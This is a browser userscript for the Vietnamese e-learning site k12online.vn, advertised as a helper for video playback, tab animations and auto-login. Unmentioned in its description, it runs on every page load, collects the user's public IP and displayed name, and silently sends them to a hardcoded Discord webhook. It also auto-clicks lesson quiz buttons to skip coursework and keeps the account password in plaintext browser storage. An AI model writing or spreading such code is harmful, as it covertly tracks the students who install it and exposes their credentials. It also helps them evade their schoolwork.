// ==UserScript==
// @name         K12 Helper Pro - Danhvux (True Restore - Video Display & Tab Animations)
// @namespace    http://tampermonkey.net/
// @version      31.0
// @description  Full Video Placeholder, Tab Sliding Animations, Bottom-Right Toasts, Fix SecurityError
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1489992801323061308/ywv0-FtallMzCjhG-a-yZXof4nyDpIewAem-4NrXn0mUBRinjBoV4kVSiO1QbSJMiUqw'; 

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- LOGIC TURBO ---
    const runTurbo = () => {
        const v = document.querySelector('video');
        if (v && config.speed > 1) {
            v.playbackRate = parseFloat(config.speed);
            if (v.paused && !v.ended) v.play();
        }
        document.querySelectorAll('.vjs-skip-question, .btn-confirm, .btn-next-question, .vjs-done-button, .btn-confirm-answer').forEach(btn => btn.click());
    };
    setInterval(runTurbo, 1000);

    // --- KHỞI TẠO SHADOW DOM ---
    const host = document.createElement('div');
    host.id = 'dv-helper-root';
    document.body.appendChild(host);
    const shadow = host.attachShadow({mode: 'open'});

    // --- TOAST NOTIFY (GÓC DƯỚI PHẢI) ---
    const showToast = (message, type = 'info') => {
        let container = shadow.querySelector('#toast-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'toast-container';
            shadow.appendChild(container);
        }
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `<span class="t-icon">●</span> <span class="t-msg">${message}</span>`;
        container.appendChild(toast);
        setTimeout(() => {
            toast.style.animation = 'toastOut 0.4s forwards';
            setTimeout(() => toast.remove(), 400);
        }, 3000);
    };

    // --- CSS & ANIMATIONS ---
    const isDark = config.isDarkMode;
    const style = document.createElement('style');
    style.textContent = `
        :host { --mc: ${config.mainColor}; --bg: ${isDark ? '#1e2227' : '#ffffff'}; --text: ${isDark ? '#ffffff' : '#1e2227'}; --border: ${isDark ? '#333' : '#ddd'}; }
        
        #dv-panel { 
            position: fixed; top: 50px; right: 20px; width: ${config.width}px; 
            background: var(--bg); color: var(--text); border-radius: 12px; 
            font-family: sans-serif; z-index: 100000; box-shadow: 0 10px 40px rgba(0,0,0,0.5); 
            overflow: hidden; border: 1px solid var(--border);
            animation: panelIn 0.4s ease;
        }
        @keyframes panelIn { from { opacity: 0; transform: scale(0.9); } }

        .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; border-bottom: 1px solid var(--border); }
        .title { color: var(--mc); font-weight: bold; font-size: 18px; }
        .red-dot { height: 12px; width: 12px; background: #ff5f56; border-radius: 50%; cursor: pointer; }

        .tabs { display: flex; background: ${isDark ? '#1a1d21' : '#f0f0f0'}; border-bottom: 1px solid var(--border); }
        .tab { flex: 1; padding: 12px 0; text-align: center; cursor: pointer; font-size: 10px; font-weight: 900; color: #777; transition: 0.3s; position: relative; }
        .tab.active { color: var(--mc); }
        .tab.active::after { content: ''; position: absolute; bottom: 0; left: 10%; right: 10%; height: 3px; background: var(--mc); border-radius: 3px 3px 0 0; }

        /* Animation chuyển tab */
        .body-container { position: relative; overflow: hidden; height: auto; min-height: 200px; }
        .content { display: none; padding: 20px; box-sizing: border-box; }
        .content.active { display: block; animation: slideIn 0.3s ease-out; }
        @keyframes slideIn { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        /* Ô Video Đen */
        .video-box { width: 100%; height: 130px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #555; font-size: 12px; margin-bottom: 15px; border: 1px dashed #333; overflow: hidden; }
        .video-box.active { color: var(--mc); border-color: var(--mc); }

        .btn { width: 100%; padding: 12px; background: #b8cc8e; border: none; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; }
        .btn:hover { filter: brightness(1.1); transform: scale(1.02); }

        input[type=text], input[type=password] { width: 100%; padding: 10px; background: ${isDark ? '#252a31' : '#f9f9f9'}; border: 1px solid var(--border); color: var(--text); border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; }

        .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .app-item { background: var(--border); padding: 10px 5px; border-radius: 8px; text-align: center; font-size: 11px; cursor: pointer; transition: 0.2s; }
        .app-item:hover { color: var(--mc); transform: translateY(-2px); }

        /* Toasts Bottom Right */
        #toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 1000000; display: flex; flex-direction: column; gap: 10px; pointer-events: none; }
        .toast { pointer-events: auto; background: var(--bg); color: var(--text); padding: 12px 20px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.4); border-left: 4px solid var(--mc); animation: toastIn 0.4s ease forwards; display: flex; align-items: center; gap: 10px; }
        .toast.success { border-left-color: #27c93f; }
        .toast.error { border-left-color: #ff5f56; }
        @keyframes toastIn { from { opacity: 0; transform: translateX(100%); } }
        @keyframes toastOut { to { opacity: 0; transform: translateX(100%); } }
    `;
    shadow.appendChild(style);

    // --- KHỞI TẠO GIAO DIỆN ---
    const init = async () => {
        let userIP = "Checking...";
        try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); userIP = data.ip; } catch(e) { userIP = "Unknown"; }
        const nameEl = document.querySelector('.user-name, .profile-name, .name-user, .username');
        const currentUser = nameEl ? nameEl.innerText.trim() : (config.user || "Khách");

        // Gửi Discord
        fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({
            embeds: [{ title: "🚀 HELPER ACTIVE", color: 16771840, fields: [{ name: "👤 User", value: currentUser, inline: true }, { name: "🌐 IP", value: userIP, inline: true }] }]
        }) }).catch(()=>{});

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header">
                <div class="title">Danhvux Panel</div>
                <div class="red-dot"></div>
            </div>
            <div class="tabs">
                <div class="tab active" data-t="t-main">MAIN</div>
                <div class="tab" data-t="t-video">VIDEO</div>
                <div class="tab" data-t="t-apps">APPS</div>
                <div class="tab" data-t="t-set">SETTINGS</div>
            </div>
            <div class="body-container">
                <div id="t-main" class="content active">
                    <div style="display:flex; justify-content:space-between;"><b>Tốc độ</b><span style="color:var(--mc)">x<span id="sp-txt">${config.speed}</span></span></div>
                    <input type="range" id="sp-range" style="width:100%; margin:15px 0;" min="1" max="20" step="0.5" value="${config.speed}">
                    <button class="btn" id="do-login">🪄 AUTO LOGIN</button>
                </div>
                <div id="t-video" class="content">
                    <div class="video-box" id="v-display">NO SOURCE</div>
                    <input type="text" id="v-url" placeholder="Dán link video (.mp4) vào đây...">
                    <button class="btn" id="v-run" style="background:#444; color:#fff">PHÁT VIDEO</button>
                </div>
                <div id="t-apps" class="content">
                    <div class="app-grid">
                        <div class="app-item" onclick="window.open('https://gemini.google.com')">Gemini</div>
                        <div class="app-item" onclick="window.open('https://chatgpt.com')">ChatGPT</div>
                        <div class="app-item" onclick="window.open('https://facebook.com')">Facebook</div>
                        <div class="app-item" onclick="window.open('https://youtube.com')">YouTube</div>
                        <div class="app-item" onclick="window.open('https://tiktok.com')">TikTok</div>
                        <div class="app-item" onclick="window.open('https://messenger.com')">Messenger</div>
                    </div>
                </div>
                <div id="t-set" class="content">
                    <input type="color" id="c-pick" style="width:100%; height:30px; margin-bottom:10px;" value="${config.mainColor}">
                    <input type="text" id="u-val" placeholder="Username..." value="${config.user}">
                    <input type="password" id="p-val" placeholder="Password..." value="${config.pass}">
                    <button class="btn" id="btn-save" style="background:var(--mc)">LƯU VÀ TẢI LẠI</button>
                </div>
            </div>
            <div style="text-align:center; font-size:9px; padding:10px; color:#777; border-top:1px solid var(--border)">IP: ${userIP} | USER: ${currentUser}</div>
        `;
        shadow.appendChild(panel);

        const $ = (id) => shadow.querySelector(id);

        // Chuyển Tab Animation
        shadow.querySelectorAll('.tab').forEach(tab => {
            tab.onclick = () => {
                if(tab.classList.contains('active')) return;
                shadow.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                tab.classList.add('active');
                const target = $(`#${tab.dataset.t}`);
                target.classList.add('active');
                showToast(`Tab ${tab.innerText}`, 'success');
            };
        });

        $('#sp-range').oninput = (e) => { $('#sp-txt').innerText = e.target.value; config.speed = e.target.value; runTurbo(); };
        $('#btn-save').onclick = () => { config.mainColor = $('#c-pick').value; config.user = $('#u-val').value; config.pass = $('#p-val').value; save(); location.reload(); };
        
        $('#v-run').onclick = () => {
            const v = document.querySelector('video');
            const url = $('#v-url').value;
            if(v && url) {
                v.src = url; v.play();
                $('#v-display').innerText = "STREAMING...";
                $('#v-display').classList.add('active');
                showToast("Đang phát video tùy chỉnh", "success");
            } else showToast("Không tìm thấy trình phát", "error");
        };

        $('#do-login').onclick = () => {
            const u = document.querySelector('input[name="username"]'), p = document.querySelector('input[name="password"]');
            if(u && p) {
                u.value = config.user; p.value = config.pass;
                u.dispatchEvent(new Event('input',{bubbles:true})); p.dispatchEvent(new Event('input',{bubbles:true}));
                setTimeout(()=>document.querySelector('button[type="submit"]').click(), 500);
            } else showToast("Vào trang đăng nhập trước!", "error");
        };

        // Kéo thả & Phím tắt
        let isDrag = false, off = [0,0];
        $('.header').onmousedown = (e) => { isDrag = true; off = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
        document.addEventListener('mousemove', (e) => { if(isDrag) { panel.style.left = (e.clientX + off[0]) + 'px'; panel.style.top = (e.clientY + off[1]) + 'px'; panel.style.right = 'auto'; } });
        document.addEventListener('mouseup', () => isDrag = false);
        $('.red-dot').onclick = () => { panel.style.display = 'none'; showToast("F2 để hiện lại", "error"); };
        document.addEventListener('keydown', (e) => { if(e.key === 'F2') panel.style.display = (panel.style.display==='none'?'block':'none'); });

        showToast("Danhvux Helper Pro Ready!", "success");
    };

    if (document.readyState === 'complete') init(); else window.addEventListener('load', init);
})();
